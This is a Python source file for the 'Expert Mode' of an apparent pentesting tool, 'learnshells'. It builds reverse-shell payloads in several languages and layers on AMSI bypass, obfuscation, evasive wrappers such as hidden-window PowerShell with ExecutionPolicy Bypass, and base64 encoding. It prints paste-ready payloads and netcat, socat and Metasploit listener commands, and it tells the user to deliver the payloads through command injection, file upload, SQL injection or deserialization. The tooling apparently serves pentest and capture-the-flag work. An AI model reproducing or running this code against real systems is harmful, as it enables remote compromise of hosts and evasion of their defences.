"""
Expert Mode - Full manual control over every parameter
"""

from typing import Optional, Dict, Any
from learnshells.utils.logger import Logger
from learnshells.generators import get_generator
from learnshells.listeners import get_listener
from learnshells.evasion.amsi_bypass import AMSIBypass
from learnshells.evasion.obfuscator import Obfuscator
from learnshells.evasion.wrappers import Wrapper
from learnshells.evasion.encoding import Encoder


class ExpertMode:
    """
    Expert Mode - Full control.
    
    For experienced pentesters who want granular control
    over every aspect of the exploitation process.
    """
    
    def __init__(self, logger: Logger = None):
        """
        Initialize Expert Mode.
        
        Args:
            logger: Logger instance
        """
        self.logger = logger or Logger(educational=False)
        
        # Initialize components
        self.amsi_bypass = AMSIBypass(self.logger)
        self.obfuscator = Obfuscator(self.logger)
        self.wrapper = Wrapper(self.logger)
        self.encoder = Encoder(self.logger)
    
    def run(self, **kwargs):
        """
        Run Expert Mode - uses parameters already collected by main.py menu.
        
        Args:
            **kwargs: Parameters from main.py menu (target_ip, listener_port, shell_type, etc.)
        """
        self.logger.banner("""
    ______                       __     __  ___          __    
   / ____/  ______  ___  _____  / /_   /  |/  /___  ____/ /___ 
  / __/ | |/_/ __ \\/ _ \\/ ___/ / __/  / /|_/ / __ \\/ __  / _ \\
 / /____>  </ /_/ /  __/ /    / /_   / /  / / /_/ / /_/ /  __/
/_____/_/|_/ .___/\\___/_/     \\__/  /_/  /_/\\____/\\__,_/\\___/ 
          /_/                                                   
        
        🎯 Full Manual Control
        """)
        
        # Get parameters from main.py (already prompted there)
        # Detect VPN interface (same as Auto Mode)
        from learnshells.core.interface_detector import InterfaceDetector
        interface_detector = InterfaceDetector(self.logger)
        
        vpn_interface = interface_detector.detect_vpn_interface()
        
        if not vpn_interface:
            self.logger.error("No VPN detected - cannot continue")
            return
        
        lhost = interface_detector.vpn_ip
        self.logger.success(f"VPN: {vpn_interface} ({lhost})")
        
        # Get other params from main.py menu prompts
        lport = getattr(self, 'listener_port', 4444)
        payload_type = getattr(self, 'shell_type', 'bash')
        listener_type = getattr(self, 'listener_type', 'netcat')
        
        # Get display mode and selections
        display_mode = getattr(self, 'display_mode', 'separate')
        selected_wrappers = getattr(self, 'selected_wrappers', None)
        selected_obfuscations = getattr(self, 'selected_obfuscations', None)
        
        # Get obfuscation/encoding - convert 'y'/'yes' to True
        obfuscate_raw = getattr(self, 'enable_obfuscation', False)
        if isinstance(obfuscate_raw, str):
            obfuscate = obfuscate_raw.lower() in ['y', 'yes', 'true']
        else:
            obfuscate = bool(obfuscate_raw)
        
        # Get wrapper setting
        wrapper_raw = getattr(self, 'enable_wrapper', False)
        if isinstance(wrapper_raw, str):
            use_wrapper = wrapper_raw.lower() in ['y', 'yes', 'true']
        else:
            use_wrapper = bool(wrapper_raw)
            
        encode_raw = getattr(self, 'enable_encoding', False)
        if isinstance(encode_raw, str):
            encode = encode_raw.lower() in ['y', 'yes', 'true']
        else:
            encode = bool(encode_raw)
            
        amsi_bypass = payload_type.lower() in ['powershell', 'ps', 'pwsh'] and getattr(self, 'amsi_bypass', False)
        
        # Display configuration
        config = {
            'lhost': lhost,
            'lport': lport,
            'payload_type': payload_type,
            'listener_type': listener_type,
            'wrapper': use_wrapper,
            'obfuscate': obfuscate,
            'encode': encode,
            'amsi_bypass': amsi_bypass
        }
        self._display_configuration(config)
        
        # Generate payload
        payload = self._generate_custom_payload(
            payload_type, lhost, int(lport), use_wrapper, obfuscate, encode, amsi_bypass,
            display_mode, selected_wrappers, selected_obfuscations
        )
        
        # Instructions
        self.logger.separator()
        self.logger.header("📌 Instructions")
        self.logger.info("1. Copy the payload below")
        self.logger.info("2. Copy the listener command below")
        self.logger.info("3. Start the listener in another terminal")
        self.logger.info("4. Paste payload into target's command execution")
        self.logger.info("5. Execute and catch the shell!")
        
        # Display payload in copy-paste friendly format
        self.logger.separator()
        self.logger.header("📋 GENERATED PAYLOAD (Copy-Paste Ready)")
        print("\n" + "="*70)
        print(f"\033[93m{payload}\033[0m")
        print("="*70 + "\n")
        
        # Display based on mode
        if display_mode == 'combined' and hasattr(self, 'combined_variants') and self.combined_variants:
            # Show combined variants only
            self.logger.separator()
            self.logger.header("🔀 COMBINED VARIANTS (Obfuscation + Wrapper)")
            print("\n\033[93m💡 Tip: Consider manually obfuscating the wrapper command itself for additional evasion\033[0m\n")
            for i, (name, variant) in enumerate(self.combined_variants, 1):
                print(f"\n{'='*70}")
                print(f"\033[95mVariant {i}: {name}\033[0m")
                print(f"{'='*70}")
                print(f"\033[93m{variant}\033[0m")
                print(f"{'='*70}\n")
        else:
            # Show separate variants
            # Display wrapper variants if enabled
            if use_wrapper and hasattr(self, 'wrapped_variants') and self.wrapped_variants:
                self.logger.separator()
                self.logger.header("📦 WRAPPER VARIANTS (Pick One)")
                for i, (name, variant) in enumerate(self.wrapped_variants, 1):
                    print(f"\n{'='*70}")
                    print(f"\033[94mVariant {i}: {name}\033[0m")
                    print(f"{'='*70}")
                    print(f"\033[93m{variant}\033[0m")
                    print(f"{'='*70}\n")
            
            # Display obfuscated variants if obfuscation is enabled
            if obfuscate and hasattr(self, 'obfuscated_variants') and self.obfuscated_variants:
                self.logger.separator()
                self.logger.header("🎭 OBFUSCATED VARIANTS (Pick One)")
                for i, (name, variant) in enumerate(self.obfuscated_variants, 1):
                    print(f"\n{'='*70}")
                    print(f"\033[96mVariant {i}: {name}\033[0m")
                    print(f"{'='*70}")
                    print(f"\033[93m{variant}\033[0m")
                    print(f"{'='*70}\n")
        
        # Display listener command
        self.logger.separator()
        self._display_listener_command(listener_type, int(lport))
        
        self.logger.separator()
        self.logger.success("\n💡 Shell Generator Mode completed!")
    
    def _show_required_parameters(self):
        """Show required parameters for Expert Mode."""
        self.logger.header("Required Parameters")
        
        params = [
            ("--target", "Target URL or IP"),
            ("--lhost", "Your IP address (attacker)"),
            ("--lport", "Listener port"),
            ("--payload-type", "Payload type (bash, python, php, powershell, etc.)")
        ]
        
        self.logger.info("Required:")
        for param, desc in params:
            self.logger.list_item(f"{param}: {desc}")
        
        self.logger.info("\nOptional:")
        optional = [
            ("--listener-type", "Listener type (netcat, socat, metasploit)"),
            ("--obfuscate", "Obfuscate payload"),
            ("--encode", "Encode payload"),
            ("--amsi-bypass", "Include AMSI bypass (Windows)"),
            ("--evasion-level", "Evasion level (1-3)")
        ]
        
        for param, desc in optional:
            self.logger.list_item(f"{param}: {desc}")
        
        self.logger.info("\nExample:")
        self.logger.command(
            "learnshells expert --target 10.10.10.50 --lhost 10.10.14.5 "
            "--lport 443 --payload-type python3 --obfuscate --encode"
        )
    
    def _display_configuration(self, config: Dict[str, Any]):
        """Display current configuration."""
        self.logger.header("Configuration")
        
        display_config = {
            "LHOST": config.get('lhost'),
            "LPORT": config.get('lport'),
            "Payload Type": config.get('payload_type'),
            "Listener": config.get('listener_type', 'netcat'),
            "Wrapper": "Enabled" if config.get('wrapper') else "Disabled",
            "Obfuscation": "Enabled" if config.get('obfuscate') else "Disabled",
            "Encoding": "Enabled" if config.get('encode') else "Disabled",
            "AMSI Bypass": "Enabled" if config.get('amsi_bypass') else "Disabled"
        }
        
        self.logger.summary("Expert Mode Settings", display_config)
    
    def _generate_custom_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        use_wrapper: bool,
        obfuscate: bool,
        encode: bool,
        amsi_bypass: bool,
        display_mode: str = 'separate',
        selected_wrappers: str = None,
        selected_obfuscations: str = None
    ) -> str:
        """Generate custom payload with all options."""
        from learnshells.generators.base import PayloadConfig
        
        self.logger.loading("Generating custom payload")
        
        # Initialize variants lists
        wrapped_variants = []
        obfuscated_variants = []
        combined_variants = []
        
        # Get generator (same as Auto Mode)
        config = PayloadConfig(lhost=lhost, lport=lport)
        generator = get_generator(payload_type)(config)
        
        # Generate base payload
        payload = generator.generate()
        
        # Apply AMSI bypass if requested
        if amsi_bypass and payload_type in ['powershell', 'ps', 'pwsh']:
            bypass = self.amsi_bypass.get_memory_patch_bypass()
            payload = f"{bypass}; {payload}"
            self.logger.success("AMSI bypass added")
        
        # Apply wrappers - BEFORE obfuscation
        if use_wrapper:
            if payload_type in ['bash', 'sh']:
                wrapped_variants = self.wrapper.wrap_bash(payload)
            elif payload_type in ['python', 'python3', 'python2']:
                wrapped_variants = self.wrapper.wrap_python(payload)
            elif payload_type in ['php']:
                wrapped_variants = self.wrapper.wrap_php(payload)
            elif payload_type in ['nodejs', 'node']:
                wrapped_variants = self.wrapper.wrap_nodejs(payload)
            elif payload_type in ['perl']:
                wrapped_variants = self.wrapper.wrap_perl(payload)
            elif payload_type in ['ruby']:
                wrapped_variants = self.wrapper.wrap_ruby(payload)
            elif payload_type in ['powershell', 'ps', 'pwsh']:
                wrapped_variants = self.wrapper.wrap_powershell(payload)
            
            self.logger.success("Payload wrapper variants generated")
        
        # Apply obfuscation - AFTER wrappers
        if obfuscate:
            if payload_type in ['bash', 'sh']:
                obfuscated_variants = self.obfuscator.obfuscate_bash(payload, lhost, lport)
            elif payload_type in ['python', 'python3', 'python2']:
                obfuscated_variants = self.obfuscator.obfuscate_python(payload, lhost, lport)
            elif payload_type in ['php']:
                obfuscated_variants = self.obfuscator.obfuscate_php(payload, lhost, lport)
            elif payload_type in ['nodejs', 'node']:
                obfuscated_variants = self.obfuscator.obfuscate_nodejs(payload, lhost, lport)
            elif payload_type in ['perl']:
                obfuscated_variants = self.obfuscator.obfuscate_perl(payload, lhost, lport)
            elif payload_type in ['ruby']:
                obfuscated_variants = self.obfuscator.obfuscate_ruby(payload, lhost, lport)
            elif payload_type in ['powershell', 'ps', 'pwsh']:
                # PowerShell still uses old level-based method
                payload = self.obfuscator.obfuscate_powershell(payload, level=2)
            
            self.logger.success("Payload obfuscation variants generated")
        
        # Generate combined variants if requested
        if display_mode == 'combined' and use_wrapper and obfuscate:
            combined_variants = self._generate_combined_variants(
                wrapped_variants, obfuscated_variants, 
                selected_wrappers, selected_obfuscations,
                lhost, lport, payload_type
            )
            self.logger.success(f"Generated {len(combined_variants)} combined variants")
        
        # Apply encoding
        if encode:
            if payload_type in ['powershell', 'ps', 'pwsh']:
                payload = self.encoder.base64_encode_unicode(payload)
                payload = f"powershell.exe -EncodedCommand {payload}"
            else:
                payload = self.encoder.base64_encode(payload)
            
            self.logger.success("Payload encoded")
        
        # Store variants for later access
        self.wrapped_variants = wrapped_variants
        self.obfuscated_variants = obfuscated_variants
        self.combined_variants = combined_variants
        self.display_mode = display_mode
        
        return payload
    
    def _display_listener_command(self, listener_type: str, lport: int):
        """Display listener command."""
        self.logger.header("🎧 LISTENER COMMAND (Copy-Paste Ready)")
        
        if listener_type == 'netcat':
            cmd = f"nc -lvnp {lport}"
        elif listener_type == 'socat':
            cmd = f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
        elif listener_type == 'metasploit':
            cmd = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {lport}; exploit'"
        else:
            cmd = f"nc -lvnp {lport}"
        
        print("\n" + "="*70)
        print(f"\033[92m{cmd}\033[0m")
        print("="*70 + "\n")
    
    def _display_execution_instructions(self, target: str, payload: str):
        """Display execution instructions."""
        self.logger.header("Execution")
        
        self.logger.info("1. Start the listener (command above)")
        self.logger.info("2. Deliver the payload to target")
        self.logger.info("3. Wait for connection")
        
        self.logger.tip(
            "Payload delivery depends on vulnerability type:\n"
            "  • Command Injection: Inject in parameter\n"
            "  • File Upload: Upload as script\n"
            "  • SQL Injection: Use xp_cmdshell or OUTFILE\n"
            "  • Deserialization: Embed in serialized object"
        )
    
    def generate_only(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        **options
    ) -> str:
        """
        Generate payload only without full workflow.
        
        Args:
            payload_type: Type of payload
            lhost: Attacker IP
            lport: Attacker port
            **options: Additional options
            
        Returns:
            Generated payload
        """
        from learnshells.generators.base import PayloadConfig
        
        config = PayloadConfig(lhost=lhost, lport=lport)
        generator = get_generator(payload_type)(config)
        payload = generator.generate()
        
        # Apply options
        if options.get('obfuscate'):
            payload = self._apply_obfuscation(payload, payload_type)
        
        if options.get('encode'):
            payload = self._apply_encoding(payload, payload_type)
        
        if options.get('amsi_bypass'):
            payload = self._apply_amsi_bypass(payload)
        
        return payload
    
    def _apply_obfuscation(self, payload: str, payload_type: str) -> str:
        """Apply obfuscation to payload."""
        if 'powershell' in payload_type.lower():
            return self.obfuscator.obfuscate_powershell(payload)
        elif 'bash' in payload_type.lower():
            return self.obfuscator.obfuscate_bash(payload)
        elif 'python' in payload_type.lower():
            return self.obfuscator.obfuscate_python(payload)
        return payload
    
    def _apply_encoding(self, payload: str, payload_type: str) -> str:
        """Apply encoding to payload."""
        if 'powershell' in payload_type.lower():
            return self.encoder.base64_encode_unicode(payload)
        return self.encoder.base64_encode(payload)
    
    def _apply_amsi_bypass(self, payload: str) -> str:
        """Apply AMSI bypass to payload."""
        bypass = self.amsi_bypass.get_memory_patch_bypass()
        return f"{bypass}; {payload}"
    
    def _generate_combined_variants(
        self,
        wrapped_variants: list,
        obfuscated_variants: list,
        selected_wrappers: str,
        selected_obfuscations: str,
        lhost: str,
        lport: int,
        payload_type: str
    ) -> list:
        """
        Generate combined wrapper + obfuscation variants based on user selection.
        Applies wrapper TO obfuscated payload (obfuscate first, then wrap).
        
        Args:
            wrapped_variants: List of wrapper variants (not used, for reference)
            obfuscated_variants: List of obfuscation variants
            selected_wrappers: Comma-separated wrapper indices (e.g., "1,3,6")
            selected_obfuscations: Comma-separated obfuscation indices
            lhost: Target host
            lport: Target port
            payload_type: Payload language type
            
        Returns:
            List of (name, payload) tuples
        """
        combined = []
        
        # Parse selections
        wrapper_indices = []
        obfuscation_indices = []
        
        # Parse wrapper selection
        if selected_wrappers:
            for idx in selected_wrappers.split(','):
                idx = idx.strip()
                if idx.isdigit():
                    num = int(idx)
                    if num == len(wrapped_variants) + 1:  # "All" option
                        wrapper_indices = list(range(len(wrapped_variants)))
                        break
                    elif 1 <= num <= len(wrapped_variants):
                        wrapper_indices.append(num - 1)
        
        # Parse obfuscation selection
        if selected_obfuscations:
            for idx in selected_obfuscations.split(','):
                idx = idx.strip()
                if idx.isdigit():
                    num = int(idx)
                    if num == len(obfuscated_variants) + 1:  # "All" option
                        obfuscation_indices = list(range(len(obfuscated_variants)))
                        break
                    elif 1 <= num <= len(obfuscated_variants):
                        obfuscation_indices.append(num - 1)
        
        # Generate combinations: Apply wrapper TO obfuscated payload
        for o_idx in obfuscation_indices:
            if o_idx < len(obfuscated_variants):
                obfusc_name, obfusc_payload = obfuscated_variants[o_idx]
                
                # Now apply wrappers to this obfuscated payload
                for w_idx in wrapper_indices:
                    wrapper_name, _ = wrapped_variants[w_idx]
                    
                    # Apply the wrapper pattern to the obfuscated payload
                    wrapped_obfusc = self._apply_wrapper_to_payload(
                        obfusc_payload, w_idx, payload_type
                    )
                    
                    combined_name = f"{obfusc_name} + {wrapper_name}"
                    combined.append((combined_name, wrapped_obfusc))
        
        return combined
    
    def _apply_wrapper_to_payload(self, payload: str, wrapper_index: int, payload_type: str) -> str:
        """
        Apply a specific wrapper to a payload.
        
        Args:
            payload: The payload to wrap
            wrapper_index: Which wrapper to apply (0-based)
            payload_type: Language type
            
        Returns:
            Wrapped payload
        """
        if payload_type in ['bash', 'sh']:
            wrappers = [
                lambda p: f"bash -c '{p}'",           # 0: Bash -c
                lambda p: f"sh -c '{p}'",             # 1: SH -c
                lambda p: f"eval '{p}'",              # 2: Eval
                lambda p: f"$({p})",                  # 3: Command substitution
                lambda p: f";{p}"                     # 4: Command chain
            ]
        elif payload_type in ['python', 'python3', 'python2']:
            wrappers = [
                lambda p: f'python -c "{p}"',
                lambda p: f'python3 -c "{p}"',
                lambda p: f'python2 -c "{p}"',
                lambda p: f'exec("{p}")'
            ]
        elif payload_type == 'php':
            wrappers = [
                lambda p: f'php -r "{p}"',
                lambda p: f"<?php {p} ?>",
                lambda p: f"<?= {p} ?>",
                lambda p: f'<?php eval("{p}"); ?>'
            ]
        elif payload_type in ['powershell', 'ps', 'pwsh']:
            wrappers = [
                lambda p: f'powershell -c "{p}"',
                lambda p: f'powershell -Command "{p}"',
                lambda p: f'powershell -ExecutionPolicy Bypass -Command "{p}"',
                lambda p: f'powershell -WindowStyle Hidden -Command "{p}"',
                lambda p: f'powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{p}"'
            ]
        elif payload_type == 'perl':
            wrappers = [
                lambda p: f"perl -e '{p}'",
                lambda p: f"perl -MSocket -e '{p}'",
                lambda p: f"perl -MIO::Socket -e '{p}'"
            ]
        elif payload_type == 'ruby':
            wrappers = [
                lambda p: f"ruby -e '{p}'",
                lambda p: f"ruby -rsocket -e '{p}'",
                lambda p: f'ruby -e "eval(\\"{p}\\")"'
            ]
        elif payload_type in ['nodejs', 'node']:
            wrappers = [
                lambda p: f"node -e '{p}'",
                lambda p: f"nodejs -e '{p}'",
                lambda p: f"node -e 'eval(\"{p}\")'",
                lambda p: f"node -e '(function(){{{p}}})()'"
            ]
        else:
            # Default: just return the payload
            return payload
        
        if wrapper_index < len(wrappers):
            return wrappers[wrapper_index](payload)
        else:
            return payload
    
    def explain_expert_mode(self) -> str:
        """Explain Expert Mode."""
        explanation = """
🎓 EXPERT MODE EXPLAINED:

What is Expert Mode?
Expert Mode gives you complete manual control over
every aspect of payload generation and delivery.

No automation. No assumptions. Full control.

Who Should Use Expert Mode:

✓ Experienced pentesters
✓ Custom engagement requirements
✓ Need specific payload configurations
✓ Bypass specific security controls
✓ Fine-tune every parameter
✓ Integration with other tools

When to Use Expert Mode:

• Specific payload requirements
• Custom obfuscation needed
• Unusual target environments
• Bypass advanced security
• Multiple evasion techniques
• Precise timing control
• Integration with scripts

Parameters You Control:

Target Configuration:
• Target URL/IP
• Target OS
• Target architecture
• Target environment

Payload Configuration:
• Payload type (bash, python, php, etc.)
• Payload variant
• Obfuscation level
• Encoding method
• AMSI bypass technique

Network Configuration:
• LHOST (your IP)
• LPORT (listener port)
• Interface to use
• Firewall considerations

Evasion Configuration:
• Obfuscation level (1-3)
• Encoding type
• AMSI bypass method
• Anti-forensics
• Stealth options

Listener Configuration:
• Listener type (nc, socat, msf)
• Listener options
• TTY configuration
• Logging options

Advantages:

✓ Complete control
✓ No surprises
✓ Reproducible
✓ Scriptable
✓ Debuggable
✓ Customizable

Disadvantages:

✗ Requires expertise
✗ More time consuming
✗ Manual everything
✗ Easy to misconfigure
✗ No safety nets

Example Workflows:

Basic Usage:
learnshells expert \\
  --target 10.10.10.50 \\
  --lhost 10.10.14.5 \\
  --lport 443 \\
  --payload-type python3

Advanced Usage:
learnshells expert \\
  --target 10.10.10.50 \\
  --lhost 10.10.14.5 \\
  --lport 443 \\
  --payload-type powershell \\
  --obfuscate \\
  --encode \\
  --amsi-bypass \\
  --evasion-level 3 \\
  --listener-type socat

Best Practices:

1. Know Your Target:
   Understand the environment before
   choosing options.

2. Test Locally:
   Test payload locally before
   using on target.

3. Document Everything:
   Keep notes on what works
   for future reference.

4. Start Simple:
   Begin with basic options,
   add complexity as needed.

5. Have Backups:
   Always have alternative
   payloads ready.

Expert Mode vs Other Modes:

Learn Mode:
• Educational
• Step by step
• For beginners

Auto Mode:
• Automated
• Fast
• For regular use

Butter Mode:
• Maximum automation
• Zero effort
• For lazy days

Expert Mode:
• Manual control
• Customizable
• For experts

Use Expert Mode when you need:
• Specific configurations
• Custom evasion
• Integration with tools
• Reproducible results
• Fine-grained control
"""
        return explanation
